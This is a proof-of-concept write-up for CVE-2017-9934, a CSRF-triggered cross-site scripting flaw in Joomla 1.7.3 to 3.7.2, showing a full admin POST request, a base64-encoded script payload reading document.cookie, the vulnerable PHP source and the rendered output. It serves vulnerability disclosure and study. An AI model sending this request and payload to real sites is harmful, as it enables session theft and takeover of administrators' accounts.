# CVE-2017-9934 (I am the reporter of this exploit, under name: Envo)
Joomla 1.7.3 - 3.7.2 CSRF exploit PoC 

This vulnerability works due to Joomla versions 1.7.3 to 3.7.2 not sanitizing base64 input. 

#Headers:
```
POST http://localhost/joomla/administrator/index.php?option=com_menus&view=item&client_id=0&layout=edit&id=0 HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Content-Length: 566
Cookie: 3139abcd402999f=ta0bmfak9faak44p4; joomla_user_state=logged_in; 8c7ff64bf1d0e216ccd4dd8c1e9745a3=4ebun9a72bolept9769d1tghu5; f8e2a3a5e2367dd628addf598dc92792=mc5g9gc7khdsa15jhijjaifrh1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Host: localhost

jform%5Bparams%5D%5Bmenu_show%5D=1&jform%5Bparams%5D%5Bmenu_text%5D=1&jform%5Bparams%5D%5Bsecure%5D=0&jform%5Btype%5D=eyJpZCI6MCwidGl0bGUiOiJjb21wb25lbnQiLCJyZXF1ZXN0Ijp7Im9wdGlvbiI6ImNvbV9mb288c2NyaXB0PmFsZXJ0KGRvY3VtZW50LmNvb2tpZSk8L3NjcmlwdD4ifX0%3D&jform%5Btemplate_style_id%5D=0&jform%5BbrowserNav%5D=0&jform%5Bid%5D=0&jform%5Bmenutype%5D=mainmenu&jform%5Bparent_id%5D=1&jform%5Bpublished%5D=1&jform%5Bhome%5D=0&jform%5Baccess%5D=1&jform%5Blanguage%5D=*&jform%5Btoggle_modules_assigned%5D=1&jform%5Btoggle_modules_published%5D=1&task=item.setType&fieldtype=type

The 'task' parameter in the above request triggers the controller function setType() in /administrator/components/com_menus/controllers/item.php, which does not require a CSRF token. This function takes base64 input in another parameter ('jform[type]') and decodes it into JSON data, without sanitization. If we craft the JSON as so:
```

#Base64: 
```
eyJpZCI6MCwidGl0bGUiOiJjb21wb25lbnQiLCJyZXF1ZXN0Ijp7Im9wdGlvbiI6ImNvbV9mb288c2NyaXB0PmFsZXJ0KGRvY3VtZW50LmNvb2tpZSk8L3NjcmlwdD4ifX0=
```
#JSON:
```
{"id":0,"title":"component","request":{"option":"com_foo<script>alert(document.cookie)</script>"}}

We can trigger an error in the load() function in /libraries/cms/component/helper.php. The $option variable contains our payload which is printed to the screen without sanitisation, resulting in XSS:
```

```Source:

if (JFactory::$language)
{
    $msg = JText::sprintf('JLIB_APPLICATION_ERROR_COMPONENT_NOT_LOADING', $option, JText::_('JLIB_APPLICATION_ERROR_COMPONENT_NOT_FOUND'));
}
else
{
    $msg = sprintf('Error loading component: %1$s, %2$s', $option, 'Component not found.');
}

Rendered:

<h4 class="alert-heading">Warning</h4>
   <div class="alert-message">Error loading component: com_foo<script>alert(document.cookie)</script>, Component not found.</div>
```
HTML page PoC is supplied within this repo.
